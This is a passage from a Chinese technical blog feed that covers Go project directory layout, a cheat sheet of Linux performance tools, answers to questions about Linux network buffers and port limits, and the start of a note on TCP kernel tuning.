强制执行的。<code>/pkg</code> 目录仍然是一种很好的方式，可以显式地表示该目录中的代码对于其他人来说是安全使用的好方法。由 Travis Jeffery  撰写的 <a href="https://travisjeffery.com/b/2019/11/i-ll-take-pkg-over-internal/"><code>I&#39;ll take pkg over internal</code></a> 博客文章提供了 <code>pkg</code> 和 <code>internal</code> 目录的一个很好的概述，以及什么时候使用它们是有意义的。</p><p>当根目录包含大量非 Go 组件和目录时，这也是一种将 Go 代码分组到一个位置的方法，这使得运行各种 Go 工具变得更加容易（正如在这些演讲中提到的那样: 来自 GopherCon EU 2018 的 <a href="https://www.youtube.com/watch?v=PTE4VJIdHPg"><code>Best Practices for Industrial Programming</code></a> , <a href="https://www.youtube.com/watch?v=oL6JBUk6tj0">GopherCon 2018: Kat Zien - How Do You Structure Your Go Apps</a> 和 <a href="https://www.youtube.com/watch?v=3gQa1LWwuzk">GoLab 2018 - Massimiliano Pippi - Project layout patterns in Go</a> ）。</p><p>这是一种常见的布局模式，但并不是所有人都接受它，一些 Go 社区的人也不推荐它。相关实例如下：</p><ul><li><a href="https://github.com/jaegertracing/jaeger/tree/master/pkg">https://github.com/jaegertracing/jaeger/tree/master/pkg</a></li><li><a href="https://github.com/istio/istio/tree/master/pkg">https://github.com/istio/istio/tree/master/pkg</a></li><li><a href="https://github.com/GoogleContainerTools/kaniko/tree/master/pkg">https://github.com/GoogleContainerTools/kaniko/tree/master/pkg</a></li><li><a href="https://github.com/google/gvisor/tree/master/pkg">https://github.com/google/gvisor/tree/master/pkg</a></li><li><a href="https://github.com/google/syzkaller/tree/master/pkg">https://github.com/google/syzkaller/tree/master/pkg</a></li><li><a href="https://github.com/perkeep/perkeep/tree/master/pkg">https://github.com/perkeep/perkeep/tree/master/pkg</a></li><li><a href="https://github.com/minio/minio/tree/master/pkg">https://github.com/minio/minio/tree/master/pkg</a></li><li><a href="https://github.com/heptio/ark/tree/master/pkg">https://github.com/heptio/ark/tree/master/pkg</a></li><li><a href="https://github.com/argoproj/argo/tree/master/pkg">https://github.com/argoproj/argo/tree/master/pkg</a></li><li><a href="https://github.com/heptio/sonobuoy/tree/master/pkg">https://github.com/heptio/sonobuoy/tree/master/pkg</a></li><li><a href="https://github.com/helm/helm/tree/master/pkg">https://github.com/helm/helm/tree/master/pkg</a></li><li><a href="https://github.com/kubernetes/kubernetes/tree/master/pkg">https://github.com/kubernetes/kubernetes/tree/master/pkg</a></li><li><a href="https://github.com/kubernetes/kops/tree/master/pkg">https://github.com/kubernetes/kops/tree/master/pkg</a></li><li><a href="https://github.com/moby/moby/tree/master/pkg">https://github.com/moby/moby/tree/master/pkg</a></li><li><a href="https://github.com/grafana/grafana/tree/master/pkg">https://github.com/grafana/grafana/tree/master/pkg</a></li><li><a href="https://github.com/influxdata/influxdb/tree/master/pkg">https://github.com/influxdata/influxdb/tree/master/pkg</a></li><li><a href="https://github.com/cockroachdb/cockroach/tree/master/pkg">https://github.com/cockroachdb/cockroach/tree/master/pkg</a></li><li><a href="https://github.com/derekparker/delve/tree/master/pkg">https://github.com/derekparker/delve/tree/master/pkg</a></li><li><a href="https://github.com/etcd-io/etcd/tree/master/pkg">https://github.com/etcd-io/etcd/tree/master/pkg</a></li><li><a href="https://github.com/oklog/oklog/tree/master/pkg">https://github.com/oklog/oklog/tree/master/pkg</a></li><li><a href="https://github.com/flynn/flynn/tree/master/pkg">https://github.com/flynn/flynn/tree/master/pkg</a></li><li><a href="https://github.com/jesseduffield/lazygit/tree/master/pkg">https://github.com/jesseduffield/lazygit/tree/master/pkg</a></li><li><a href="https://github.com/gopasspw/gopass/tree/master/pkg">https://github.com/gopasspw/gopass/tree/master/pkg</a></li><li><a href="https://github.com/sosedoff/pgweb/tree/master/pkg">https://github.com/sosedoff/pgweb/tree/master/pkg</a></li><li><a href="https://github.com/GoogleContainerTools/skaffold/tree/master/pkg">https://github.com/GoogleContainerTools/skaffold/tree/master/pkg</a></li><li><a href="https://github.com/knative/serving/tree/master/pkg">https://github.com/knative/serving/tree/master/pkg</a></li><li><a href="https://github.com/grafana/loki/tree/master/pkg">https://github.com/grafana/loki/tree/master/pkg</a></li><li><a href="https://github.com/bloomberg/goldpinger/tree/master/pkg">https://github.com/bloomberg/goldpinger/tree/master/pkg</a></li><li><a href="https://github.com/Ne0nd0g/merlin/tree/master/pkg">https://github.com/Ne0nd0g/merlin/tree/master/pkg</a></li><li><a href="https://github.com/jenkins-x/jx/tree/master/pkg">https://github.com/jenkins-x/jx/tree/master/pkg</a></li><li><a href="https://github.com/DataDog/datadog-agent/tree/master/pkg">https://github.com/DataDog/datadog-agent/tree/master/pkg</a></li><li><a href="https://github.com/dapr/dapr/tree/master/pkg">https://github.com/dapr/dapr/tree/master/pkg</a></li><li><a href="https://github.com/cortexproject/cortex/tree/master/pkg">https://github.com/cortexproject/cortex/tree/master/pkg</a></li><li><a href="https://github.com/dexidp/dex/tree/master/pkg">https://github.com/dexidp/dex/tree/master/pkg</a></li><li><a href="https://github.com/pusher/oauth2_proxy/tree/master/pkg">https://github.com/pusher/oauth2_proxy/tree/master/pkg</a></li><li><a href="https://github.com/pdfcpu/pdfcpu/tree/master/pkg">https://github.com/pdfcpu/pdfcpu/tree/master/pkg</a></li><li><a href="https://github.com/weaveworks/kured/tree/master/pkg">https://github.com/weaveworks/kured/tree/master/pkg</a></li><li><a href="https://github.com/weaveworks/footloose/tree/master/pkg">https://github.com/weaveworks/footloose/tree/master/pkg</a></li><li><a href="https://github.com/weaveworks/ignite/tree/master/pkg">https://github.com/weaveworks/ignite/tree/master/pkg</a></li><li><a href="https://github.com/tmrts/boilr/tree/master/pkg">https://github.com/tmrts/boilr/tree/master/pkg</a></li><li><a href="https://github.com/kata-containers/runtime/tree/master/pkg">https://github.com/kata-containers/runtime/tree/master/pkg</a></li><li><a href="https://github.com/okteto/okteto/tree/master/pkg">https://github.com/okteto/okteto/tree/master/pkg</a></li><li><a href="https://github.com/solo-io/squash/tree/master/pkg">https://github.com/solo-io/squash/tree/master/pkg</a></li></ul><p>如果你的应用程序项目真的很小，并且额外的嵌套并不能增加多少价值(除非你真的想要:-)，那就不要使用它。当它变得足够大时，你的根目录会变得非常繁琐时(尤其是当你有很多非 Go 应用组件时)，请考虑一下。</p><h3 id="vendor"><a href="#vendor" class="headerlink" title="/vendor"></a><code>/vendor</code></h3><p>应用程序依赖项(手动管理或使用你喜欢的依赖项管理工具，如新的内置 <a href="https://github.com/golang/go/wiki/Modules"><code>Go Modules</code></a> 功能)。<code>go mod vendor</code> 命令将为你创建 <code>/vendor</code> 目录。请注意，如果未使用默认情况下处于启用状态的 Go 1.14，则可能需要在 <code>go build</code> 命令中添加 <code>-mod=vendor</code> 标志。</p><p>如果你正在构建一个库，那么不要提交你的应用程序依赖项。</p><p>注意，自从 <a href="https://golang.org/doc/go1.13#modules"><code>1.13</code></a> 以后，Go 还启用了模块代理功能(默认使用 <a href="https://proxy.golang.org/"><code>https://proxy.golang.org</code></a> 作为他们的模块代理服务器)。在<a href="https://blog.golang.org/module-mirror-launch"><code>here</code></a> 阅读更多关于它的信息，看看它是否符合你的所有需求和约束。如果需要，那么你根本不需要 <code>vendor</code> 目录。</p><p>国内模块代理功能默认是被墙的，七牛云有维护专门的的<a href="https://github.com/goproxy/goproxy.cn/blob/master/README.zh-CN.md"><code>模块代理</code></a> 。</p><h2 id="服务应用程序目录"><a href="#服务应用程序目录" class="headerlink" title="服务应用程序目录"></a>服务应用程序目录</h2><h3 id="api"><a href="#api" class="headerlink" title="/api"></a><code>/api</code></h3><p>OpenAPI&#x2F;Swagger 规范，JSON 模式文件，协议定义文件。</p><p>相关实例:</p><ul><li><a href="https://github.com/kubernetes/kubernetes/tree/master/api">https://github.com/kubernetes/kubernetes/tree/master/api</a></li><li><a href="https://github.com/moby/moby/tree/master/api">https://github.com/moby/moby/tree/master/api</a></li></ul><h2 id="Web-应用程序目录"><a href="#Web-应用程序目录" class="headerlink" title="Web 应用程序目录"></a>Web 应用程序目录</h2><h3 id="web"><a href="#web" class="headerlink" title="/web"></a><code>/web</code></h3><p>特定于 Web 应用程序的组件:静态 Web 资产、服务器端模板和 SPAs。</p><h2 id="通用应用目录"><a href="#通用应用目录" class="headerlink" title="通用应用目录"></a>通用应用目录</h2><h3 id="configs"><a href="#configs" class="headerlink" title="/configs"></a><code>/configs</code></h3><p>配置文件模板或默认配置。</p><p>将你的 <code>confd</code> 或 <code>consul-template</code> 模板文件放在这里。</p><h3 id="init"><a href="#init" class="headerlink" title="/init"></a><code>/init</code></h3><p>System init（systemd，upstart，sysv）和 process manager&#x2F;supervisor（runit，supervisor）配置。</p><h3 id="scripts"><a href="#scripts" class="headerlink" title="/scripts"></a><code>/scripts</code></h3><p>执行各种构建、安装、分析等操作的脚本。</p><p>这些脚本保持了根级别的 Makefile 变得小而简单(例如， <a href="https://github.com/hashicorp/terraform/blob/master/Makefile"><code>https://github.com/hashicorp/terraform/blob/master/Makefile</code></a> )。</p><p>相关示例。</p><ul><li><a href="https://github.com/kubernetes/helm/tree/master/scripts">https://github.com/kubernetes/helm/tree/master/scripts</a></li><li><a href="https://github.com/cockroachdb/cockroach/tree/master/scripts">https://github.com/cockroachdb/cockroach/tree/master/scripts</a></li><li><a href="https://github.com/hashicorp/terraform/tree/master/scripts">https://github.com/hashicorp/terraform/tree/master/scripts</a></li></ul><h3 id="build"><a href="#build" class="headerlink" title="/build"></a><code>/build</code></h3><p>打包和持续集成。</p><p>将你的云( AMI )、容器( Docker )、操作系统( deb、rpm、pkg )包配置和脚本放在 <code>/build/package</code> 目录下。</p><p>将你的 CI (travis、circle、drone)配置和脚本放在 <code>/build/ci</code> 目录中。请注意，有些 CI 工具(例如 Travis CI)对配置文件的位置非常挑剔。尝试将配置文件放在 <code>/build/ci</code> 目录中，将它们链接到 CI 工具期望它们的位置(如果可能的话)。</p><h3 id="deployments"><a href="#deployments" class="headerlink" title="/deployments"></a><code>/deployments</code></h3><p>IaaS、PaaS、系统和容器编排部署配置和模板(docker-compose、kubernetes&#x2F;helm、mesos、terraform、bosh)。注意，在一些存储库中(特别是使用 kubernetes 部署的应用程序)，这个目录被称为 <code>/deploy</code>。</p><h3 id="test"><a href="#test" class="headerlink" title="/test"></a><code>/test</code></h3><p>额外的外部测试应用程序和测试数据。你可以随时根据需求构造 <code>/test</code> 目录。对于较大的项目，有一个数据子目录是有意义的。例如，你可以使用 <code>/test/data</code> 或 <code>/test/testdata</code> (如果你需要忽略目录中的内容)。请注意，Go 还会忽略以“.”或“_”开头的目录或文件，因此在如何命名测试数据目录方面有更大的灵活性。</p><p>相关示例。</p><ul><li><a href="https://github.com/openshift/origin/tree/master/test">https://github.com/openshift/origin/tree/master/test</a> (test data is in the <code>/testdata</code> subdirectory)</li></ul><h2 id="其他目录"><a href="#其他目录" class="headerlink" title="其他目录"></a>其他目录</h2><h3 id="docs"><a href="#docs" class="headerlink" title="/docs"></a><code>/docs</code></h3><p>设计和用户文档(除了 godoc 生成的文档之外)。</p><p>有关示例，请参阅 <a href="docs/README.md"><code>/docs</code></a> 目录。</p><h3 id="tools"><a href="#tools" class="headerlink" title="/tools"></a><code>/tools</code></h3><p>这个项目的支持工具。注意，这些工具可以从 <code>/pkg</code> 和 <code>/internal</code> 目录导入代码。</p><p>相关示例。</p><ul><li><a href="https://github.com/gohugoio/hugo/tree/master/docs">https://github.com/gohugoio/hugo/tree/master/docs</a></li><li><a href="https://github.com/openshift/origin/tree/master/docs">https://github.com/openshift/origin/tree/master/docs</a></li><li><a href="https://github.com/dapr/dapr/tree/master/docs">https://github.com/dapr/dapr/tree/master/docs</a></li></ul><h3 id="examples"><a href="#examples" class="headerlink" title="/examples"></a><code>/examples</code></h3><p>你的应用程序和&#x2F;或公共库的示例。</p><p>相关示例。</p><ul><li><a href="https://github.com/nats-io/nats.go/tree/master/examples">https://github.com/nats-io/nats.go/tree/master/examples</a></li><li><a href="https://github.com/docker-slim/docker-slim/tree/master/examples">https://github.com/docker-slim/docker-slim/tree/master/examples</a></li><li><a href="https://github.com/hashicorp/packer/tree/master/examples">https://github.com/hashicorp/packer/tree/master/examples</a></li></ul><h3 id="third-party"><a href="#third-party" class="headerlink" title="/third_party"></a><code>/third_party</code></h3><p>外部辅助工具，分叉代码和其他第三方工具(例如 Swagger UI)。</p><h3 id="githooks"><a href="#githooks" class="headerlink" title="/githooks"></a><code>/githooks</code></h3><p>Git hooks。</p><h3 id="assets"><a href="#assets" class="headerlink" title="/assets"></a><code>/assets</code></h3><p>与存储库一起使用的其他资产(图像、徽标等)。</p><h3 id="website"><a href="#website" class="headerlink" title="/website"></a><code>/website</code></h3><p>如果不使用 Github 页面，则在这里放置项目的网站数据。</p><p>相关示例。</p><ul><li><a href="https://github.com/hashicorp/vault/tree/master/website">https://github.com/hashicorp/vault/tree/master/website</a></li><li><a href="https://github.com/perkeep/perkeep/tree/master/website">https://github.com/perkeep/perkeep/tree/master/website</a></li></ul><h2 id="不应该拥有的目录"><a href="#不应该拥有的目录" class="headerlink" title="不应该拥有的目录"></a>不应该拥有的目录</h2><h3 id="src"><a href="#src" class="headerlink" title="/src"></a><code>/src</code></h3><p>有些 Go 项目确实有一个 <code>src</code> 文件夹，但这通常发生在开发人员有 Java 背景，在那里它是一种常见的模式。如果可以的话，尽量不要采用这种 Java 模式。你真的不希望你的 Go 代码或 Go 项目看起来像 Java:-)</p><p>不要将项目级别 <code>src</code> 目录与 Go 用于其工作空间的 <code>src</code> 目录(如 <a href="https://golang.org/doc/code.html"><code>How to Write Go Code</code></a> 中所述)混淆。<code>$GOPATH</code> 环境变量指向你的(当前)工作空间(默认情况下，它指向非 windows 系统上的 <code>$HOME/go</code>)。这个工作空间包括顶层 <code>/pkg</code>, <code>/bin</code> 和 <code>/src</code> 目录。你的实际项目最终是 <code>/src</code> 下的一个子目录，因此，如果你的项目中有 <code>/src</code> 目录，那么项目路径将是这样的: <code>/some/path/to/workspace/src/your_project/src/your_code.go</code>。注意，在 Go 1.11 中，可以将项目放在 <code>GOPATH</code> 之外，但这并不意味着使用这种布局模式是一个好主意。</p><h2 id="好的开源项目架构示例"><a href="#好的开源项目架构示例" class="headerlink" title="好的开源项目架构示例"></a>好的开源项目架构示例</h2><h3 id="go-gin-api"><a href="#go-gin-api" class="headerlink" title="go-gin-api"></a>go-gin-api</h3><p><img src="https://s2.loli.net/2022/11/22/JQMUV8NkzcIaSWT.png" alt="image.png"></p><h3 id="k8s"><a href="#k8s" class="headerlink" title="k8s"></a>k8s</h3><p><img src="https://s2.loli.net/2022/11/22/4kELthJAS5DiYyX.png" alt="image.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/golang-standards/project-layout">https://github.com/golang-standards/project-layout</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux指标查看工具</title>
    <link href="/2022/11/16/Linux%E6%8C%87%E6%A0%87%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7/"/>
    <url>/2022/11/16/Linux%E6%8C%87%E6%A0%87%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">#                          Linux指标查看工具<blockquote><p>本文笔记来自：「极客时间  Linux 性能优化实战」，原文链接：<a href="https://time.geekbang.org/column/article/80898">https://time.geekbang.org/column/article/80898</a></p></blockquote><h2 id="性能工具速查"><a href="#性能工具速查" class="headerlink" title="性能工具速查"></a>性能工具速查</h2><p><strong>在选择性能工具时，除了要考虑性能指标这个目的外，还要结合待分析的环境来综合考虑</strong>。比如，实际环境是否允许安装软件包，是否需要新的内核版本等。</p><p>性能工具谱图如下：</p><p><img src="https://static001.geekbang.org/resource/image/b0/01/b07ca95ef8a3d2c89b0996a042d33901.png?wh=3000*2100" alt="img"></p><p>（图片来自 <a href="http://www.brendangregg.com/linuxperf.html">brendangregg.com</a>）</p><p>这张图从 Linux 内核的各个子系统出发，汇总了对各个子系统进行性能分析时，你可以选择的工具。</p><p><strong>从性能指标出发，根据性能指标的不同，将性能工具划分为不同类型</strong>。比如，最常见的就是可以根据 CPU、内存、磁盘 I&#x2F;O 以及网络的各类性能指标，将这些工具进行分类。</p><h2 id="CPU性能工具"><a href="#CPU性能工具" class="headerlink" title="CPU性能工具"></a>CPU性能工具</h2><p>首先，从 CPU 的角度来说，主要的性能指标就是 CPU 的使用率、上下文切换以及 CPU Cache 的命中率等。下面这张图就列出了常见的 CPU 性能指标。</p><p><img src="https://static001.geekbang.org/resource/image/9a/69/9a211905538faffb5b3221ee01776a69.png?wh=1241*1212" alt="img"></p><p>从这些指标出发，再把 CPU 使用率，划分为系统和进程两个维度，工具表如下：</p><p><img src="https://static001.geekbang.org/resource/image/28/b0/28cb85011289f83804c51c1fb275dab0.png?wh=1707*2563" alt="img"></p><h2 id="内存性能工具"><a href="#内存性能工具" class="headerlink" title="内存性能工具"></a>内存性能工具</h2><p>接着我们来看内存方面。从内存的角度来说，主要的性能指标，就是系统内存的分配和使用、进程内存的分配和使用以及 SWAP 的用量。下面这张图列出了常见的内存性能指标。</p><p><img src="https://static001.geekbang.org/resource/image/ee/c0/ee36f73b9213063b3bcdaed2245944c0.png?wh=1581*1760" alt="img"></p><p>内存性能工具速查表如下：</p><p><img src="https://static001.geekbang.org/resource/image/79/f8/79ad5caf0a2c105b7e9ce77877d493f8.png?wh=1653*2198" alt="img"></p><p>注：最后一行pcstat的源码链接为 <a href="https://github.com/tobert/pcstat">https://github.com/tobert/pcstat</a></p><h2 id="磁盘I-x2F-O性能工具"><a href="#磁盘I-x2F-O性能工具" class="headerlink" title="磁盘I&#x2F;O性能工具"></a>磁盘I&#x2F;O性能工具</h2><p>接下来，从文件系统和磁盘 I&#x2F;O 的角度来说，主要性能指标，就是文件系统的使用、缓存和缓冲区的使用，以及磁盘 I&#x2F;O 的使用率、吞吐量和延迟等。下面这张图列出了常见的 I&#x2F;O 性能指标。</p><p><img src="https://static001.geekbang.org/resource/image/72/3b/723431a944034b51a9ef13a8a1d4d03b.png?wh=2631*808" alt="img"></p><p>文件系统和磁盘 I&#x2F;O 性能工具速查表如下：</p><p><img src="https://static001.geekbang.org/resource/image/c2/a3/c232dcb4185f7b7ba95c126889cf6fa3.png?wh=1714*2424" alt="img"></p><h2 id="网络性能工具"><a href="#网络性能工具" class="headerlink" title="网络性能工具"></a>网络性能工具</h2><p>最后，从网络的角度来说，主要性能指标就是吞吐量、响应时间、连接数、丢包数等。根据 TCP&#x2F;IP 网络协议栈的原理，我们可以把这些性能指标，进一步细化为每层协议的具体指标。</p><p><img src="https://static001.geekbang.org/resource/image/37/a4/37d04c213acfa650bd7467e3000356a4.png?wh=1983*1104" alt="img"></p><p>网络性能工具速查表如下：</p><p><img src="https://static001.geekbang.org/resource/image/5d/5d/5dde213baffd7811ab73c82883b2a75d.png?wh=1709*2462" alt="img"></p><h2 id="基准测试工具"><a href="#基准测试工具" class="headerlink" title="基准测试工具"></a>基准测试工具</h2><p>除了性能分析外，很多时候，我们还需要对系统性能进行基准测试。比如，</p><ul><li><p>在文件系统和磁盘 I&#x2F;O 模块中，我们使用 fio 工具，测试了磁盘 I&#x2F;O 的性能。</p></li><li><p>在网络模块中，我们使用 iperf、pktgen 等，测试了网络的性能。</p></li><li><p>而在很多基于 Nginx 的案例中，我们则使用 ab、wrk 等，测试 Nginx 应用的性能。</p></li></ul><p>Brendan Gregg 整理的 Linux 基准测试工具图谱如下：</p><p><img src="https://static001.geekbang.org/resource/image/f0/e9/f094f489049602e1058e02edc708e6e9.png?wh=1500*1050" alt="img"></p><p>（图片来自 <a href="http://www.brendangregg.com/linuxperf.html">brendangregg.com</a>）</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这篇文章梳理了常见的性能工具，并从 CPU、内存、文件系统和磁盘 I&#x2F;O、网络以及基准测试等不同的角度，汇总了各类性能指标所对应的性能工具速查表。</p><p>当分析性能问题时，大的来说，主要有这么两个步骤：</p><ul><li><p>第一步，从性能瓶颈出发，根据系统和应用程序的运行原理，确认待分析的性能指标。</p></li><li><p>第二步，根据这些图表，选出最合适的性能工具，然后了解并使用工具，从而更快观测到需要的性能数据。</p></li></ul><p>虽然 Linux 的性能指标和性能工具都比较多，但熟悉了各指标含义后，自然就会发现这些工具同性能指标间的关联。顺着这个思路往下走，掌握这些工具的选用其实并不难。</p><p>当然，不要把性能工具当成性能分析和优化的全部。</p><ul><li><p>一方面，性能分析和优化的核心，是对系统和应用程序运行原理的掌握，而性能工具只是辅助你更快完成这个过程的帮手。</p></li><li><p>另一方面，完善的监控系统，可以提供绝大部分性能分析所需的基准数据。从这些数据中，你很可能就能大致定位出性能瓶颈，也就不用再去手动执行各类工具了。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>笔记</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>13.linux网络的相关问题记录</title>
    <link href="/2022/11/16/13-linux%E7%BD%91%E7%BB%9C%E7%9A%84%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/11/16/13-linux%E7%BD%91%E7%BB%9C%E7%9A%84%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="13-linux网络的相关问题记录"><a href="#13-linux网络的相关问题记录" class="headerlink" title="13.linux网络的相关问题记录"></a>13.linux网络的相关问题记录</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt; 本文笔记来自：「极客时间  Linux 性能优化实战」，原文链接：https:<span class="hljs-regexp">//</span>time.geekbang.org<span class="hljs-regexp">/column/</span>article/<span class="hljs-number">80898</span><br></code></pre></td></tr></table></figure><h2 id="问题-1：网络收发过程中缓冲区的位置"><a href="#问题-1：网络收发过程中缓冲区的位置" class="headerlink" title="问题 1：网络收发过程中缓冲区的位置"></a>问题 1：网络收发过程中缓冲区的位置</h2><p>之前文章介绍过 Linux 网络的收发流程。涉及到了多个队列和缓冲区，包括：</p><ul><li><p>网卡收发网络包时，通过 DMA 方式交互的 <strong>环形缓冲区</strong>；</p></li><li><p>网卡中断处理程序为网络帧分配的，内核数据结构 <strong>sk_buff 缓冲区</strong>；</p></li><li><p>应用程序通过套接字接口，与网络协议栈交互时的 <strong>套接字缓冲区。</strong></p></li></ul><p>不过相应的，就会有两个问题。</p><p>首先，这些缓冲区的位置在哪儿？是在网卡硬件中，还是在内存中？这个问题其实仔细想一下，就很容易明白——这些缓冲区都处于内核管理的内存中。</p><p>其中， <strong>环形缓冲区</strong>，由于需要 DMA 与网卡交互，理应属于网卡设备驱动的范围。</p><p><strong>sk_buff 缓冲区</strong>，是一个维护网络帧结构的双向链表，链表中的每一个元素都是一个网络帧（Packet）。虽然 TCP&#x2F;IP 协议栈分了好几层，但上下不同层之间的传递，实际上只需要操作这个数据结构中的指针，而无需进行数据复制。</p><p><strong>套接字缓冲区</strong>，则允许应用程序，给每个套接字配置不同大小的接收或发送缓冲区。应用程序发送数据，实际上就是将数据写入缓冲区；而接收数据，其实就是从缓冲区中读取。至于缓冲区中数据的进一步处理，则由传输层的 TCP 或 UDP 协议来完成。</p><p>其次，这些缓冲区，跟 Buffer 和 Cache 有什么关联吗？</p><p>内存中的 Buffer ，都跟块设备直接相关；而其他的都是 Cache。</p><p>实际上，sk_buff、套接字缓冲、连接跟踪等，都通过 slab 分配器来管理。可以直接通过 &#x2F;proc&#x2F;slabinfo，来查看它们占用的内存大小。</p><h2 id="问题-2：内核协议栈，是通过一个内核线程的方式来运行的吗"><a href="#问题-2：内核协议栈，是通过一个内核线程的方式来运行的吗" class="headerlink" title="问题 2：内核协议栈，是通过一个内核线程的方式来运行的吗"></a>问题 2：内核协议栈，是通过一个内核线程的方式来运行的吗</h2><p>第二个问题，内核协议栈的运行，是按照一个内核线程的方式吗？在内核中，又是如何执行网络协议栈的呢？</p><p>说到网络收发，在中断处理文章中我曾讲过，其中的软中断处理，就有专门的内核线程 ksoftirqd。每个 CPU 都会绑定一个 ksoftirqd 内核线程，比如， 2 个CPU 时，就会有 ksoftirqd&#x2F;0 和 ksoftirqd&#x2F;1 这两个内核线程。</p><p>不过要注意，并非所有网络功能，都在软中断内核线程中处理。内核中还有很多其他机制（比如硬中断、kworker、slab 等），这些机制一起协同工作，才能保证整个网络协议栈的正常运行。</p><h2 id="问题-3：最大连接数是不是受限于-65535-个端口"><a href="#问题-3：最大连接数是不是受限于-65535-个端口" class="headerlink" title="问题 3：最大连接数是不是受限于 65535 个端口"></a>问题 3：最大连接数是不是受限于 65535 个端口</h2><p>我们知道，无论 TCP 还是 UDP，端口号都只占 16 位，也就说其最大值也只有 65535。那是不是说，如果使用 TCP 协议，在单台机器、单个 IP 地址时，并发连接数最大也只有 65535 呢？</p><p>对于这个问题，首先要知道，Linux 协议栈，通过五元组来标志一个连接（即协议，源IP、源端口、目的IP、目的端口)。</p><p>明白了这一点，这个问题其实就有了思路。我们应该分客户端和服务器端，这两种场景来分析。</p><p>对客户端来说，每次发起 TCP 连接请求时，都需要分配一个空闲的本地端口，去连接远端的服务器。由于这个本地端口是独占的，所以客户端最多只能发起 65535 个连接。</p><p>对服务器端来说，其通常监听在固定端口上（比如 80 端口），等待客户端的连接。根据五元组结构，我们知道，客户端的IP和端口都是可变的。如果不考虑 IP 地址分类以及资源限制，服务器端的理论最大连接数，可以达到 2 的 48 次方（IP 为 32 位，端口号为 16 位），远大于65535。</p><p>所以，综合来看，客户端最大支持65535个连接，而服务器端可支持的连接数是海量的。当然，由于 Linux 协议栈本身的性能，以及各种物理和软件的资源限制等，这么大的连接数，还是远远达不到的（实际上，C10M 就已经很难了）。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>笔记</tag>
      
      <tag>linux</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>12.网络性能优化的几个思路（下）</title>
    <link href="/2022/11/15/12-%E5%A5%97%E8%B7%AF%E7%AF%87%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%9A%84%E5%87%A0%E4%B8%AA%E6%80%9D%E8%B7%AF%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <url>/2022/11/15/12-%E5%A5%97%E8%B7%AF%E7%AF%87%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%9A%84%E5%87%A0%E4%B8%AA%E6%80%9D%E8%B7%AF%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="12-网络性能优化的几个思路（下）"><a href="#12-网络性能优化的几个思路（下）" class="headerlink" title="12.网络性能优化的几个思路（下）"></a>12.网络性能优化的几个思路（下）</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt; 本文笔记来自：「极客时间  Linux 性能优化实战」，原文链接：https:<span class="hljs-regexp">//</span>time.geekbang.org<span class="hljs-regexp">/column/</span>article/<span class="hljs-number">80898</span><br></code></pre></td></tr></table></figure><p>上一篇在优化网络的性能时，可以结合 Linux 系统的网络协议栈和网络收发流程，然后从应用程序、套接字、传输层、网络层再到链路层等每个层次，进行逐层优化。主要学习了应用程序和套接字的优化思路，比如：</p><ul><li><p>在应用程序中，主要优化 I&#x2F;O 模型、工作模型以及应用层的网络协议；</p></li><li><p>在套接字层中，主要优化套接字的缓冲区大小。</p></li></ul><p>这篇文章将顺着 TCP&#x2F;IP 网络模型，继续向下，看看如何从传输层、网络层以及链路层中，优化 Linux 网络性能。</p><h2 id="网络性能优化"><a href="#网络性能优化" class="headerlink" title="网络性能优化"></a>网络性能优化</h2><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>传输层最重要的是 TCP 和 UDP 协议，所以这儿的优化，其实主要就是对这两种协议的优化。</p><p>我们首先来看TCP协议的优化。</p><p>TCP 提供了面向连接的可靠传输服务。要优化 TCP，我们首先要掌握 TCP 协议的基本原理，比如流量控制、慢启动、拥塞避免、延迟确认以及状态流图（如下图所示）等。</p><p><img src="https://static001.geekbang.org/resource/image/c0/d1/c072bb9c9dfd727ed187bc24beb3e3d1.png?wh=1920*1447" alt="img"></p><p><strong>掌握这些原理后</strong>，就可以在不破坏 TCP 正常工作的基础上，对它进行优化。</p><p>下面，分几类情况详细说明。</p><p>第一类，在请求数比较大的场景下，可能会看到大量处于 TIME_WAIT 状态的连接，它们会占用大量内存和端口资源。这时，我们可以优化与 TIME_WAIT 状态相关的内核选项，比如采取下面几种措施。</p><ul><li><p>增大处于 TIME_WAIT 状态的连接数量 net.ipv4.tcp_max_tw_buckets ，并增大连接跟踪表的大小 net.netfilter.nf_conntrack_max。</p></li><li><p>减小 net.ipv4.tcp_fin_timeout 和 net.netfilter.nf_conntrack_tcp_timeout_time_wait ，让系统尽快释放它们所占用的资源。</p></li><li><p>开启端口复用 net.ipv4.tcp_tw_reuse。这样，被 TIME_WAIT 状态占用的端口，还能用到新建的连接中。</p></li><li><p>增大本地端口的范围 net.ipv4.ip_local_port_range 